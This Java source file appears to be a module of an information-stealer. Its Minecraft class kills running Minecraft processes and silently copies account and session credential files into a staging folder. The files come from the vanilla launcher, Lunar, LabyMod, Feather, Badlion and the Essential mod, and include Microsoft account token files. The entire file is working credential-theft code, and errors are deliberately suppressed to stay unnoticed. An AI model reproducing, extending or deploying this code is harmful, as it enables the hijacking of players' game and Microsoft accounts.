package itzgonza.hollyshit.impl.game;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

import org.apache.commons.io.FileUtils;

import itzgonza.hollyshit.utils.utilities;

public class Minecraft extends utilities {

    public void initialize() {
        // Kill Minecraft processes
        try {
            Runtime.getRuntime().exec("taskkill /IM javaw.exe /F");
            Thread.sleep(1000);
        } catch (Exception ignored) {}
        
        // ONLY copy specific files to avoid GIGABYTES of assets/libraries
        List<File> minecraftFiles = getMinecraftFiles();
        for (File f : minecraftFiles) {
            try {
                File destFile = new File(getFolder() + "/game/minecraft/" + f.getName());
                destFile.getParentFile().mkdirs();
                FileUtils.copyFile(f, destFile);
                content.add("minecraft");
            } catch (Exception ignored) {}
        }
        
        // Essential Mod Session
        File essentialDir = new File(System.getenv("APPDATA") + "/.minecraft/essential/microsoft_accounts.json");
        if (essentialDir.exists()) {
            try {
                FileUtils.copyFileToDirectory(essentialDir, new File(getFolder() + "/game/minecraft/essential/"));
            } catch (Exception ignored) {}
        }
    }

    private static List<File> getMinecraftFiles() {
        String[] paths = {
            System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json",
            System.getenv("APPDATA") + "/.minecraft/launcher_accounts_microsoft_store.json",
            System.getenv("APPDATA") + "/.minecraft/launcher_accounts.json",
            System.getenv("APPDATA") + "/.minecraft/LabyMod/accounts.json",
            System.getenv("APPDATA") + "/.minecraft/launcher_profiles.json",
            System.getenv("APPDATA") + "/.feather/accounts.json",
            System.getenv("APPDATA") + "/Badlion Client/accounts.dat",
            System.getenv("APPDATA") + "/.minecraft/launcher_msa_credentials.bin",
            System.getenv("APPDATA") + "/.minecraft/usercache.json"
        };
        return Arrays.stream(paths)
                .filter(path -> Files.exists(Paths.get(path)))
                .map(File::new)
                .collect(Collectors.toList());
    }
}